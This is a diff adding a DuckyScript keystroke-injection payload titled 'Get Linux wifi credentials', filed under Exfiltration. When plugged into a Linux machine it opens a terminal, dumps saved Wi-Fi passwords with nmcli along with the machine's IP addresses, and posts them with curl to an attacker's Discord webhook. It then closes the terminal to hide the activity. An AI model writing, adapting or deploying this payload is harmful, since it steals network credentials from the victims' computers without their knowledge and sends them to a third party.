@@ -1,0 +1,42 @@
+REM_BLOCK
+###############################################
+#                                             |
+# Title        : Get Linux wifi credentials   |
+# Author       : simen64                      |
+# Version      : 1.0                          |
+# Category     : Exfiltration                 |
+# Target       : Linux                        |
+#                                             |
+###############################################
+END_REM
+
+REM change to your keyboard layout
+DUCKY_LANG NO
+
+REM put your discord webhook here
+DEFINE #dc webhook here
+
+DELAY 2000
+CAPSLOCK_DISABLE
+DEFAULT_DELAY 10
+
+REM_BLOCK
+Use this if your target is using Gnome (remove REM_BLOCK and END_REM + this line)
+ALT F2
+DELAY 200
+STRINGLN xterm -fa monaco -fs 1
+DELAY 500
+END_REM
+
+REM_BLOCK
+Use this if your targets DE or WM has the ctrl-alt-t shortcut (remove REM_BLOCK and END_REM + this line)
+CTRL-ALT t
+DELAY 500
+END_REM
+
+STRING output=$(nmcli dev wifi show-password && nmcli | grep "inet4\|inet6" | grep -v "127.0.0.1\|::1" | sed 's/
+CTRL v
+TAB
+STRINGLN //')
+STRINGLN escaped_output=$(printf '%s' "$output" | jq -sRr @json)
+STRINGLN curl -H "Content-Type: application/json" -d "{\"username\": \"Wifi grabber\", \"content\": $escaped_output}" "#dc" && exit
